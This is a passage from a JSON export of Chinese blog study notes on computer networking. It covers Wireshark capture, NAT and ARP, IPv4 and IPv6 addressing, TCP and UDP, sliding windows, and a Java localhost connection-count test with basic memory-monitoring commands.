断开连接需要四次挥手，非常麻烦","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"数据包抓包","slug":"计网/数据包抓包","date":"2021-06-27T15:09:52.000Z","updated":"2021-06-29T04:56:53.972Z","comments":true,"path":"2021/06/27/计网/数据包抓包/","link":"","permalink":"https://www.shanghua.live/2021/06/27/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8A%93%E5%8C%85/","excerpt":"","text":"WiresharkWireshark 是世界上应用最广泛的网络协议分析器，它让我们在微观层面上看到整个网络正在发生的事情。可以去 Wireshark 官网下载 Wireshark 官网 Wireshark 具有丰富的功能集 深入检查数百个协议，并不断添加更多协议 事实捕捉和离线分析 支持 Windows、Linux、MacOs、Solaris、等多种操作系统 提供 GPU 浏览、也可以通过 TTY 支持 VOIP 支持 Gzip 支持 IPSec 打开 WiresharkLinux 打开 Wireshark 如下界面 这里列出了电脑的网卡，你可以选择抓包的网卡，这里我的电脑是有限上网，所以选择 enp1s0，点击后会进入捕获页面 在这里可以看到非常多的数据包，有发送的，以及接受的数据包。页面没列以此是 序号（No）是 Wireshark 分配的一个从捕获开始的编号 时间（Time）是从捕获开始过去的时间戳，可以从在上方菜单栏 视图 -&gt; 时间显示格式 修改显示的格式 源地址和目标地址（Source 和 Destination）是 IP 协议，注意这里有 IPv6 的地址，也有 IPv4 的地址 协议可能有很多种，比如 TCP/UDP/ICMP 等，ICMP 是 IP 协议之上搭建的一个消息控制协议（Internet Conetol Message Protocol）比如 Ping 命令用的就是 ICMP； 还有 ARP 协议（Address Resolution Protocol）用来在局域网广播自己的 MAC 地址 Length 是消息的长度（Bytes） Info 是根据不同协议显示的数据，比如你可以看到 TCP 协议上看到 Seq 和 ACK。这里的 Seq 和 ACK 已经简化过了，正常情况是一个大随机数 观察 TCP 协议查看捕获页面的单个 TCP 协议 然后下方可以观察到详细内容 可以看到详细信息是从不同层面捕获的。从传输层看是 TCP 段；从网络层看是 IP 封包；从链路层看是 Frame 点开不同的层面观察 TCP 段，就可以获得对它更具体的认识，例如下图是从 TCP 层面理解这次捕获 可以看出这次是一次 ACK，从 80 端口发送到 60478，下方还有二进制窗口，可以看到此次消息的 16 进制形式 再来张全家图 Whireshark 追溯的是最底层网卡传输的 Frame（帧），可以追溯到数据的链路层。因此对我们二进制的解读，也就是消息试图也要分层。因为对同样的数据，不同层的解读是不同的 最上面是 Frame 数据，主要是关注数据的收发时间和大小 接着是数据链路层数据，关注的是设备的传递。你可以看到源 MAC 地址和目标 MAC 地址。 然后是网络层数据，IP层数据。这里有 IP 地址（源 IP 地址和目标 IP 地址）；也有头部 Checksum 最下面是传输层数据。也就是 TCP 协议。关注的是源端口，目标端口，Seq、ACK 等 有的传输层上还有一个 TLS 协议，这是因为用 HTTPS 请求了数据。TLS 也是传输层。TLS 是建立在 TCP 之上，复用了 TCP 的逻辑 观察 HTTP 协议 可以看到，Wireshark 不仅仅捕获了应用层，还可以看到这次 HTTP 捕获对应的传输层、网络层和链路层数据。 过滤和筛选Wireshark 还提供了捕获的过滤，我们只需要输入过滤条件，就可以只看符合条件的捕获。 首先我们通过 ping 命令查看百度的 IP 地址，如下图 在 Wireshark 中输入表达式 ip.addr == 39.156.66.18 ，如下图 这样就可以看到所有与 baidu 相关的连接。上图刚好是一次建立 TCP 连接（3 次握手），到 HTTPS 协议传输握手的完整过程。你可以只看到 192.168.1.109 到 39.156.66.18 的请求 首先是从客户端（192.168.1.5）发出的 SYN 和百度返回的 SYN-ACK，如下图所示： 然后是客户端返回给百度一个 ACK： 接下来是 HTTPS 协议开始工作 可以看到 HTTPS 协议通过 TLSv1.2 发送了 Client Hello 到服务端。接下来是 Server 返回给客户端 ACK，然后再发送给客户端一个 Server Hello： 之后百度回传了证书，握手结束 报文颜色在抓包过程中，黑色报文代表各类报文错误；红色代表出现异常；其他颜色代表正常传输 注意，红色是深红色，并不是此图中的粉红色","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"计算机网络入门 局域网-NAT","slug":"计网/局域网NAT","date":"2021-06-27T13:47:14.000Z","updated":"2021-06-27T07:09:04.290Z","comments":true,"path":"2021/06/27/计网/局域网NAT/","link":"","permalink":"https://www.shanghua.live/2021/06/27/%E8%AE%A1%E7%BD%91/%E5%B1%80%E5%9F%9F%E7%BD%91NAT/","excerpt":"","text":"NAT 是如何工作的当一个公司申请到一个公网 IP，会在公司内部设置一个局域网，这个局域网中通常 IP 地址，会以 192.168 开头当一个员工使用 UDP 协议发送信息向王者荣耀服务器，可是员工的 IP 地址是一个内网 IP，数据到王者荣耀服务器可以通过寻址和路由找到目的地但是数据从王者荣耀服务器回来的时候，王者荣耀服务器如何知道 192.168 开头的地址应该如何寻址呢？ 局域网数据交换（MAC 地址）设备间通讯的本质：设备拥有的网络接口（网卡）间的通信 为了区别每个网络接口，互联网工程任务组（IETF）要求每个设备拥有一个唯一的编号 MAC 地址 IP 地址不是唯一的吗?并不是的，如果你将电脑搬到另一个城市 IP 地址就会改变，电脑网卡的 MAC 地址不会发生变化数据交换，必须经过交换机，毕竟线路是由网卡连接交换机的 数据发送方将本身的 MAC 地址，以及目的地的 MAC 地址，Frame 或者封包，发送给交换机，交换机根据地址转发给目的地或者目的地的网卡这个 Frame，并不是 IP 协议的分组链路层的数据交换，支持 IP 协议工作，是网络层的底层如果 IP 协议要传输数据，就要将数据转换为链路层的分组，然后才可以在链路层传输，链路层的大小受限于链路层的网络设备、线路以及使用了链路层协议的设计MTU（Maximun Transmission Unit）最大传输单元 链路层网络允许的最大传输数据分组的大小MSS（Maximun Segment Size，最大段大小） TCP 段 TCP 分组（TCP Packet）的最大大小MSS 是传输层概念，MTU 是链路层概念MTU = MSS + TCP Header + IP HeaderTCP 传输的数据大于 MSS，就拆包，每个封包上加上 TCP Header，之后经过 IP 协议，再加上 IP Header，于是这个加上 IP 头的分组（Packet）不能超过 MTU 对于一个 网络接口，它如何能知道目标接口的 MAC 地址呢？ 地址解析协议（Address Resoulution Protocol，ARP）发送接口会发送一个广播查询给交换机，交换机将查询转发给所有接口，如果某个接口发现自己就是对方要查下的接口，则会将自己的 MAC 地址回传然后再交换机增加缓存条目，缓存采用的是逐级缓存的设计减少 ARP 请求（发送接口先查询本地的 ARP 表，如何本地没有数据，然后广播 ARP 查询） ARP 表是一种缓存，缓存需要考虑 失效时间、更新策略、数据接口 考虑使用 TTL（Time To Live）的设计，为每个缓存条目增加一个失效时间 更新策略可以考虑利用老化（Aging）算法模拟 LRU 家用设备会提供局域网 具备交换机的能力，又具有路由器的能力 当 ARP 表很大的时候，需要专门的、能够承受大量网络接口的交换设备 连接内网有时候，公司内部有多个子网，这个时候一个子网如果要访问另一个子网，就需要通过路由器也就是说。路由器其实充当了两个子网通讯的桥梁。发送接口并不能通过 MAC 地址发送数据到接收接口，因为两个子网之间只有路由器相连，子网1 的交换机不知道子网2 的交换机。这个时候发送方需要通过 IP 协议，将数据发送到路由器，再由路由器转发信息到子网2 的交换机子网2 的交换机通过 查询 ARP 表来找到 IP 地址的接口 连接外网（网络地址转换技术，NAT）flowchart LR; A[192.168.0.1] &lt;--私有网络--&gt; B[NAT + 路由器] &lt;--互联网--&gt; C[服务 22.22.22.22] 寻找目标 IP 地址 22.22.22.22 是一个公网 IP，可以通过正常的寻址 + 路由算法定位，当 22.22.22.22 寻找 192.168.0.1 的时候，是寻找一个私网 IP，这个时候是找不到的。这个时候就需要使用网络地址转换技术，NAT 技术转换的是 IP 地址，私有 IP 通过 NAT 转换为公网 IP 发送到服务区。服务器的响应通过 NAT转换为私有 IP，返回给客户端，通过这种方式就解决了内网和外网通讯的问题 总结 链路层发送数据靠的是 MAC 地址 交换机（链路层交换机）：不断接受数据，然后转发数据 地址解析协议（ARP）: 已知 IP 地址，找到 MAC 地址的协议 网络和网络的衔接，必须要有路由器（等价的设备）","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"IPv4 协议","slug":"计网/IP协议","date":"2021-06-23T17:37:43.000Z","updated":"2021-06-23T11:43:17.253Z","comments":true,"path":"2021/06/24/计网/IP协议/","link":"","permalink":"https://www.shanghua.live/2021/06/24/%E8%AE%A1%E7%BD%91/IP%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"什么是 IP 协议IP 协议，是一个处于垄断地位的网络层协议，IPv4 就是 IP 协议的地 4 个版本，是目前互联网的主要网络层协议IPv4 是目前互联网的主要网络层协议。IPv4 为传输层提供 Host-To-Host 的能力，IPv4 需要底层数据链路层的支持IP 协议并不负责数据的可靠性，传输数据时，IP 协议还会对数据进一步拆分。进行两次拆分是为了适配底层的设备 可靠性是要保证数据无损传输到目的地，是由 IP 协议上方，Host-To-Host 协议保证了，TCP 通过应答机制，窗口等保证IP 协议自身不能保证可靠性。比如 IP 协议可能面临下面几个问题 封包损坏（数据传输过程中被损坏） 丢包（数据发送过程中丢失） 重发（数据被重发，比如中间设备通过 2 个路径传递数据） 乱序（到达目的地时数据与发送数据不一致） IP 协议并不会去处理这些问题，因为网络层只专注解决网络层的问题，而且不同特性的应用在不同场景下需要解决的问题不一样对于网络层，有三个问题需要解决 延迟 吞吐量 丢包率 IP 协议的工作原理IP 协议接受 IP 协议上方的 Host-To-Host 协议来传输数据，然后进行拆分，这个能力叫作切片（Fragmentation）IP 协议为每个片段（Fragmentation）增加一个 IP 头（Header），组成一个 IP 封包（Datagtam）。之后 IP 协议调用底层的局域网（数据链路层）传输数据。最后 IP 协议通过寻址和路由能力最终把封包送达目的地。 分片是吧数据切分成片IP 协议通过局域网（链路层）传输数据，因此需要适配底层传输网络的传输能力如果底层（链路层）发现一个未经过封包的数据，又没有能力传输时，就直接丢弃数据包在网络环境中往往存在多条路径，一条路径断了，说不定其他路径可能连通 增加协议头（IP Header） 分为四个部分 最重要的是原地址和目标地址。IPv4 的地址是4组8位的数字，总共是32位。 Type of Service 服务的类型是为了响应不同的用户诉求，用来选择延迟、吞吐量和丢包率之间的关系。 IML（Internet Header Length）用来描述 IP 协议头的大小。所以 IP 协议头的大小是可变的。IHL 只有4位，最大值 1111 = 15 最大是 15 个双字（15*4 字节 = 60 字节） Total Length 定义报文（封包 Datagram）的长度。 Identification（报文的 ID），发送方分配，代表顺序。 Fragment offset 描述要不要分包（拆分），以及如何拆分 Time To Live（TTL） 描述封包的存货时间。因此每个 IP 封包发送出去后，就开始销毁倒计时。如果倒计时为0就会销毁。比如中间的路由器看到一个 TTL 为0 的封包，就直接丢弃 Protcol 描述上层的协议，比如 TCP = 6，UDP = 17 Options 代表可选项 Checksum 用来检验封包的正确性，类似 UDP，如果 Checksum 不对，就要丢弃这个封包 Type of Service 延迟（Latency）指的是 1 bit 的数据从网络的一个终端传送到另一个终端需要的时间 吞吐量（Throughput）吞吐量指单位时间内可以传输的平均数据量 丢包率（Packet loss）指的是发送出去的封包没有到达指定目的地的比例 Type of Service 有4个选项低延迟，高吞吐量，地丢包率，低成本 寻址（Addressing）地址想要表达的是一个东西在哪里。寻址要做的就是：给一个地址，然后找到这个东西。IPv4 协议的寻址过程是逐级寻址。 IPv4 地址IPv4 地址是4个8位（Octet）排列而成，总共可以编址43亿个地址 103.16.3.1 103 16 3 1 01100111 0010000 00000011 001001 寻址过程 找到顶层网络比如 103.16.3.1 最顶层的网络号可以和 225.0.0.0 （子网掩码）做位运算得到103.16.3.1 &amp; 255.0.0.0 = 103.0.0.0因此103.0.0.0就是103.16.3.1所在的顶层网络。255.0.0.0.称作子网掩码。子网掩码的作用就是帮助根据 IP 地址找到对应子网。子网掩码是很多个1接着很多个0，和 IP 地址一起使用。 找到下一层网络接下来要找到下一层网络，就需要 IP 地址和下一级的子网掩码做位与运算103.16.3.1 &amp; 255.255.0.0 = 103.16.0.0其中 103.16.0.0 就是下一级的网络号 再下一级网络通过子网掩码 255.255.255.0 子网掩码找到下一级网络 103.16.3.0 定位设备设备就在子网 103.16.3.0 中，最终找到的设备号是 1当然子网掩码也不一定都是255，比如这个子网掩码255.240.0.0也是可以的。但通常我们把 IPv4 的网络分成这样 4 层。 路由（Routing）在寻址过程中，数据总是存在于某个局域网中。如果目的地在局域网中，就可以直接定位设备了。如果目的地不在局域网中，这个时候就需要再去往其他网络假设，我们要前往 IP 地址为 14.215.177.38 寻址，当前的路由器所在的网络编号是 16.0.0.0。那么我们就需要知道前往 14.0.0.0 网络的 Gateway IP 地址在当前网络执行 route 查看路由表，可能看到一条下面这样的记录。 Destination:14.0.0.0 Gateway:16.12.1.100 Mask:255.0.0.0 Iface:16.12.1.1 这条记录就表示如果你要去 14.0.0.0 网络，IP 地址，14.215.177.38 先要和 255.0.0.0,进行位运算然后查表 看到 14.0.0.0 得知去往 Gateway 的网卡（IFace） 是 16.12.1.1 总结 IP 协议会讲数据进行分片，将上游数据拆分成一个个的封包（Datagram），然后封包增加 IP 头部。封包发送出去后，就开始可寻址过程。寻址就是找到 IP 地址对应的设备，在同一局域网内，如果找不到设备，就需要路由。路由就是找打数据应该往哪里发送。最后通过层层路由定位到具体的设备。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"IPv6 协议","slug":"计网/IPv6协议","date":"2021-06-23T17:37:43.000Z","updated":"2021-06-27T05:47:19.654Z","comments":true,"path":"2021/06/24/计网/IPv6协议/","link":"","permalink":"https://www.shanghua.live/2021/06/24/%E8%AE%A1%E7%BD%91/IPv6%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"IPv4 用 32 位整数描述地址，最多支持 43 亿设备，显然不够用 可以拆分子网来解决 IPv4 不够用的问题，内外网数据交互，需要网络地址转换协议（NAT 协议），增加传输成本多级网络会增加数据的路由和传输链路，降低网络的速度 IPv62019 年据中国互联网络中心（CNNIC）统计，IPv6 协议目前在我国普及率 60%，已经位居时间首位 什么是 Tunnel 技术 IPv4 与 IPv6 相似点 IPv6：切片（Segmentation）、增加封包头、路由（寻址） IPv6：接受上方主机到主机（Host-To-Host）协议传递来的数据 最核心的能力：确保数据可以从发送主机到达接收主机 不相同点 IPv4地址是 4 个 8 位（octeat），共 32 位 IPv6 8 个 16 位（hextet），共 128 位 IPv4 使用 . 点分割 如 103.28.7.35 IPv6 使用 : 冒号分割 0123:4567:89ab:cdef:0123:4567:89ab:cdef 也可以省略前 64 字节简写为 0123:4567::0123:4567:0000:cdef:: 只能出现一次，相当于省略了若干个 0000。比如 1111::2222 相当于中间省略了 6 组 0000。如果出现两个 1111::2222::3333 就无法得知 0000 是如何分部的。开头的 0 也可以简写为 123:4567::123:4567:0:cdef还有一种情况，如果我们想后面都填 0 比如 3c4d::/16,这代表只有前 16 位有数据，后面是 0 IPv6 寻址寻址的目的：找到设备，以及规划到设备途径的路径，最核心的内容，对网络进行划分 全局单播寻址，1 对 1 寻址 本地单播 类似 IPv4 内部网络，开头必须是 fe80 分组多播（Group Multicast） 广播 任意播 特殊方式 全局单薄将消息从一个设备传到另一个设备全局单薄地址：目标就是定位网络中的设备IPv6 地址太多，因此不再需要子网掩码，而是直接将 IPv6 的地址分区即可 在全局单播中，IPv6 分为 3 部分 站点前缀（Site Prefix）48 bit，一般是由 ISP （Internet Service Providor，运营商）或者 RIR （Regional Internet Registry，地区性互联网注册机构），RIR 将 IP 地址分配给运营商 子网好（Subnet ID），16bit 用于站点内部区分子网 接口号（Interface），64bit，用于站点内部区分设备 因此 IPv6 也是树状结构，站点前缀需要一定资质，子网号与接口号内部定义。IPv6 的寻址过程就是先通过站点前缀找到站点，然后追踪子网；每个子网中，还可以用 64 位整数表示设备。 本地单播在局域网中，实现设备到设备的通讯虽然 IPv6 可以给每个设备一个 IP 地址，但是有些情况还是需要一个局域网络的 1234Format | Link-Locl prefix| 0 | Interface ID | | 10 bits | 64 bit | 54 bits|Example : fe80::123e:456d 分组多播实现广播：将消息同时发送给多个接收者 当 IP 地址以 8 个 1 开头，也就是 ff00 开头，后面会跟上一个分组的编号，就是在进行分组多播 任意播任意播：将消息发送给多个接收方，并选择一条最优的路径 在一个网络中有多个接收方，这些授时服务都共享了一个任播地址当一个客户端想要获取时间，就可以讲请求发送到这个任意播地址，客户端的请求扩散出去后，可能会找到授时服务中的一个或者多个，但是距离最近的往往会被先发现。这个时候，客户端使用它第一次收到的授时信息修正自己的时间 IPv4 和 IPv6 兼容两种情况 情况1：一个 IPv4 的网络和一个 IPv6 的网络通讯 首先 客户端去 DNS64（提供的一种解决 IPv4 和IPv6 兼容问题的 DNS 服务），这个查询服务会吧 IPv4 地址和 IPv6 地址同事返回 DNS64 服务器返回含 IPv4 地址的 AAAA 记录。 客户端将对应的 IPv4 地址请求发送给一个 NAT64 路由器 由这个 NAT64 路由器将 IPv6 地址转换为 IPv4 地址，从而访问 IPv4 网络，并收集结果 消息返回到客户端 情况2：一个 IPv6 的网络和一个 IPv6 的网络通讯，但是中间需要经过一个 IPv4 的网络 隧道的本质：在两个 IPv6 的网络出口网关处，实现一段地址转换的程序 总结 IPv6 IPv6 解决的是地址耗尽的问题, 减少了子网，更小的封包头部体积，提升了性能 Tunnel 技术是什么？ Tunnel 就是隧道，隧道不是只有一辆车通过，而是每天都有大量的车辆来来往往 两个网络，用隧道连接，位于两个网络中的通讯设备，都可以使用这个隧道","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"最大连接测试","slug":"计网/最大连接测试","date":"2021-06-23T15:09:52.000Z","updated":"2021-06-23T09:26:43.487Z","comments":true,"path":"2021/06/23/计网/最大连接测试/","link":"","permalink":"https://www.shanghua.live/2021/06/23/%E8%AE%A1%E7%BD%91/%E6%9C%80%E5%A4%A7%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/","excerpt":"","text":"Java 创建 Socket 连接一台内存在 8G 左右的服务器，可以同时维护多少连接？ 连接是内存中的状态对象，从理论上分析，连接本身不太占用内存。不同语言连接对象大小不等，但是通常很小。我们可以写个 Java 程序测试一下 Server 端 12345678910111213141516public class ServerDemo &#123; public static void main(String[] args) throws IOException &#123; var serverSocket = new ServerSocket(); // 3001 端口 var address = new InetSocketAddress(3001); serverSocket.bind(address); var list = new LinkedList&lt;&gt;(); while (true)&#123; // 监听连接 var client = serverSocket.accept(); list.add(client); System.out.println(list.size()); &#125; &#125;&#125; Client 端 123456789101112public class ClientDemo &#123; public static void main(String[] args) throws IOException, InterruptedException &#123; var clients = new LinkedList&lt;&gt;(); // 循环 一百万次 for (int i = 0; i &lt; 1000000; i++) &#123; // 连接 3001 端口 var client = new Socket(&quot;127.0.0.1&quot;,3001); clients.add(client); &#125; TimeUnit.SECONDS.sleep(100); &#125;&#125; 创建 100W 连接速度不快，说明 TCP 连接创建有成本 用 jps 找到对应的进程 id，用 sudo cat /proc/{进程ID}/status | grep VmHWM 查看占用内存 执行 jps 命令,我们可以看到输出 1234538931 Main42676 Launcher42679 Server39259 RemoteMavenServer3642734 Jps Server 就是我们启动的进程， 进程 ID 为 42679执行 bash 命令 1sudo cat /proc/42679/status | grep VmHWM 输出 VmHWM: 42636 kB,可以看到随着连接创建，占用不停增长当单机建立太多链接，会爆出 Cannot assign requested address 异常，这是由于没建立一个连接，操作系统就会为客户端分配端口号，端口号很快就被占用用尽 所以核心问题是，通信需要缓冲区，通讯需要 I/O 。这是因为通讯占用资源，连接本身占用资源少。 有哪些 好用的压力测试工具？压力测试最常用的工具是 Apache Benchmark （简称 AB） linux 可执行以下命令安装 123yum install httpd-tools// orapt-get install apache2-utils 还有一款更好用的 Java 生态工具 JMeter, 安装 Java 运行环境就可使用 具体用法有空我再做一篇笔记","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"TCP 和 UDP","slug":"计网/TCP和UDP","date":"2021-06-20T17:00:01.000Z","updated":"2021-06-23T04:43:16.057Z","comments":true,"path":"2021/06/21/计网/TCP和UDP/","link":"","permalink":"https://www.shanghua.live/2021/06/21/%E8%AE%A1%E7%BD%91/TCP%E5%92%8CUDP/","excerpt":"","text":"TCP 可靠性 HTTP 协议 1.1 和 2.2 UDP 灵活 HTTP 协议 3.0 UDP 协议UDP 在数据传输，网络控制，音视频，Web 技术UDP (User Datagram Protocol) 目标是在传输层提供直接发送报文(Datagram)的能力 Datagram 是数据传输的最小单位 UDP 协议不会帮助拆分数据，它的目标只有一个，就是发送报文 为什么不用 IP 协议呢 graph LR; A[应用层] --&gt; B[传输层] --&gt; C[IP协议层] 传输层 (端口号，每个端口代表不同的应用) IP 协议 (将数据从主机传输到主机) UDP 的封包格式 Soure Port(源端口号) Destination(目标端口号) Length(消息体长度) Checksum(校验和) Data octets。。。(一个一个字节数据) 校验和 (Checksum) 机制：校验数据在传输过程中有没有丢失、损坏。是一个普遍需求 简单的校验和程序 checksum=(a+b+c+d) ^ 0xff 接收方可以用同样的算法检查，不过还是可能碰撞 UDP 与 TCP 的区别 TCP (提供可靠的网络传输) UDP (在提供报文交换能力基础上尽可能地简化协议，轻装上阵)只管发送数据包，不管是否发送成功 TCP 是一个面向连接的协议(Connection-oriented Protocol) UDP 无连接协议 (Connection-less Protocol) TCP 流控技术(在发送缓冲区中存储数据，并在接受缓冲区中接受数据) UDP 没有流控，不过 UDP 协议简化，没有连接，可靠性检查等，速度更快 TCP 不适合高速传输数据场景(视频，游戏) UDP(Ping 和 DNSLookup，只需要一次简单的请求/返回，不需要建立连接) TCP 无损传输文件 UDP 传输数据更快 TCP HTTP 协议 UDP HTTP 3.0 理论上来讲，任何一个用 TCP 协议构成的成熟应用层协议，都可以用 UDP 重构 TCP 的场景 远程控制 File Transfer Protocol(FTP) 邮件(SMTP，IMAP)等 点对点文件传出(微信等) UDP 场景 网络游戏 音视频传输 DNS Ping 直播 模糊地带 HTTP (目前以 TCP 为主) 文件传输 UDP 不提供可靠性，不代表不能解决可靠性 UDP 的核心价值：灵活、轻便，构造了最小版本的传输层协议我们可以为 UDP 实现连接 (Connection)，实现会话 (Session),实现可靠性 (Reliability) … 总结 TCP 协议可以培养思维的缜密性 （序号的设计，滑动窗口的设计，快速重发的设计，内在状态机的设计） UDP 协议可以带动我们反思自己的技术架构 报文传输 - 可靠性 - 流量控制 - 连接和会话 TCP 最核心的价值就是提供好了一套解决可靠性的优秀方案 TCP 在确保吞吐量、延迟、丢包率的基础上，保证可靠性 UDP 提供了最小版的实现，只支持 Checksum UDP 最核心的价值：灵活、轻量、传输速度快","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"TCP-滑动窗口-流速控制","slug":"计网/TCP-滑动窗口-流速控制","date":"2021-06-20T15:53:20.000Z","updated":"2021-06-21T08:26:55.771Z","comments":true,"path":"2021/06/20/计网/TCP-滑动窗口-流速控制/","link":"","permalink":"https://www.shanghua.live/2021/06/20/%E8%AE%A1%E7%BD%91/TCP-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3-%E6%B5%81%E9%80%9F%E6%8E%A7%E5%88%B6/","excerpt":"","text":"!! 此篇博客内容来自 拉勾教育 作为一个传输层协议，最核心的能力是传输，传输需要保证可靠性，还需要控制流速，这两个核心均由滑动窗口提供 请求/响应模型每一个请求收到响应之后，再发送下一个请求，吞吐量会很低。因为这样的设计，会产生网络的空闲时间，说白了，就是浪费带宽。带宽没有用满，意味着可以同时发送更多的请求，接收更多的响应。 一种改进的方式，就是让发送方有请求就发送出去，而不是等待响应。通过这样的处理方式，发送的数据连在了一起，响应的数据也连在了一起，吞吐量就提升了。 排队（Queuing）在这种情况下，我们通常会考虑排队机制 这样做就需要多个队列，我们要将未发送的数据从队列中取出，加入发送中的队列。然后再将发送中的数据，收到 ACK 的部分取出，放入已接收的队列。而发送中的封包，何时收到 ACK 是一件不确定的事情，这样使用队列似乎也有一定的问题。 滑动窗口（Sliding Window） 深绿色代表已经收到 ACK 的段 浅绿色代表发送了，但是没有收到 ACK 的段 白色代表没有发送的段 紫色代表暂时不能发送的段 这个时候滑动窗口可以向右滑动，如下图所示： 重传如果发送过程中，部分数据没能收到 ACK 会怎样呢？这就可能发生重传。如果发生下图这样的情况，段 4 迟迟没有收到 ACK。 这个时候滑动窗口只能右移一个位置，如下图所示： 在这个过程中，如果后来段 4 重传成功（接收到 ACK），那么窗口就会继续右移。如果段 4 发送失败，还是没能收到 ACK，那么接收方也会抛弃段 5、段 6、段 7。这样从段 4 开始之后的数据都需要重发。 快速重传在 TCP 协议中，如果接收方想丢弃某个段，可以选择不发 ACK。发送端超时后，会重发这个 TCP 段。而有时候，接收方希望催促发送方尽快补发某个 TCP 段，这个时候可以使用快速重传能力。例如段 1、段 2、段 4 到了，但是段 3 没有到。 接收方可以发送多次段 3 的 ACK。如果发送方收到多个段 3 的 ACK，就会重发段 3。这个机制称为快速重传。这和超时重发不同，是一种催促的机制。为了不让发送方误以为段 3 已经收到了，在快速重传的情况下，接收方即便收到发来的段 4，依然会发段 3 的 ACK（不发段 4 的 ACK），直到发送方把段 3 重传。 流速控制假设 RTT = 1ms, 带宽是 1mb/s如果窗口大小为 1kb，那么 1ms 可以发送一个 1kb 段数据（含 TCP 头）1s 就可以发送 1mb 的数据，刚好可以将带宽用慢如果 RTT 再慢一些，比如 RTT = 10ms ,这样的设计就只能用完 1/10 的带宽 总结有了窗口，发送方利用滑动窗口算法发送消息；接收方构造缓存区接受消息，并给发送方 ACK 滑动窗口是 TCP 协议控制可靠性的核心，发送方将数据拆包，变成多个分组，然后讲数据放入一个拥有滑动窗口的数组，依次发出，然后遵循，先入先出（FIFO）的顺序单数窗口中的分组会一次性发送。窗口中序号最小的分组如果收到 ACK ，窗口就会发生滑动，如果最小序号的分组长时间没有收到 ACK，就会触发整个窗口的数据重新发送","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"TCP-封包-拆包","slug":"计网/TCP-封包-拆包","date":"2021-06-20T13:16:22.000Z","updated":"2021-06-21T08:26:53.271Z","comments":true,"path":"2021/06/20/计网/TCP-封包-拆包/","link":"","permalink":"https://www.shanghua.live/2021/06/20/%E8%AE%A1%E7%BD%91/TCP-%E5%B0%81%E5%8C%85-%E6%8B%86%E5%8C%85/","excerpt":"","text":"TCP 封包 TCP 协议是如何恢复数据的顺序的 ? 拆包和粘包的作用是什么 ? TCP 是一个传输协议，会讲数据进行拆分进行发送，为什么不分批发送？ 为了稳定性，一次性发送的数据越多，出错的概率越大 为了效率，拆分的数据包就能更好的利用这些并行的路径 发送和接受数据都有缓冲区，缓存区是在内存中开辟的一块区域，目的是缓冲 在传输层封包不能太大以缓存区大小为单位 TCP 协议： 会将数据拆分成不超过缓冲区大小的一个个部分 每个部分都有一个独特的名称，叫做 TCP 段（TCP Segment） 拆包：将数据拆分成多个 TCP 段传输 粘包：将多个数据合并成一个 TCP 段发送 TCP SegmentTCP 分组格式示意图 Source Port/DestinationPort 描述的事发送端口号和目标端口号，代表发送数据的应用程序和接受数据的应用程序 Sequence Number 和 Achnowlendgment Number 是保证可靠性的两个关键 Data Offset 是一个偏移量，原因：TCP Header 部分的长度可变，需要一个数值来描述数据从哪个字节开始 Reserved 是很多协议设计会保留的一个区域，用于日后扩展能力 URG/ACK/PSH/PST/SYN/FIN 是几个标志位，用来描述 TCP 段的行为 URG 代表一个紧急数据（比如终结程序） ACK 代表响应 PSH 代表数据的推送，传输数据 SYN 同步请求，申请握手 FIN 终止请求，挥手 这五个标志位一个占一个 bit 可同时使用 Window 也是 TCP 保证稳定性并进行流量控制的工具 Checksum 是校验和，用来校验 TCP 段有没有损坏 Urgent Poninter 指向最后一个紧急数据的序号（Sequece Number） Option 中存储了一些可选字段 MSS （Maxiumun Segment Size）(长度不固定) Padding 存在的意义是因为 Option 的长度不固定，需要 Pading 进行对齐 Sequece Number 和 Achnowlendgment Number拆包：数据被分成很多个部分，部分增加了协议头合并成一个 TCP 段，进行传输TCP 段经过复杂的网络结构，由底层的 IP 协议，负责传输到目的地，然后进行重组 稳定性要求是数据无损地传输（拆包获得的数据，又需要恢复到原来的样子）数据虽然是顺序发送的，但不能保证是顺序接受的发送的每一个 TCP 段都需要有序号 – Sequence Number（Seq） 发送数据的时候，为每一个 TCP 段分配一个自增的 Sequence Number 接受数据的时候，可以通过 Sequence Number 为乱序的 TCP 段进行排序 接收方回复发送方，也需要 seq，而网络的两个终端，去同步一个自增的序号是非常困难的 对于任何一个接收方，如果知道了发送者发送某个 TCP 段时，已经发送了多少个字节的数据，那么就可以确认发送者发送数据的顺序如果接收方也向发送者发送了数据请求，接收方就不知道发送者发送的数据到底对应哪一条自己发送的数据？每一个 TCP 段发送时，发送方已经接受了多少数据 Achnowlendgment（ACK） 无论是 Seq 和 ACK 都是针对 “对方” 而言的 MSS （Maxiumun Sequence Size） 重要的 TCP Header 中的可选择（Options） 可选性控制 TCP 段的大小，它是一个协商字段（Negotiate） 协商是双方都要遵循的标准，配置不能由单方决定，需要双方协商 TCP 段的大小（MSS）涉及发送、接收缓存区的大小设置 双方实际发送接受封包的大小，对拆包和粘包的过程有知道作用 设置的过大会降低性能 用户占用服务器太多的资源，意味着其他的用户就需要等待或者降低他们的服务质量 支持 TCP 协议工作的 IP 协议，工作效率会下降 IP 协议为什么需要拆包呢？ 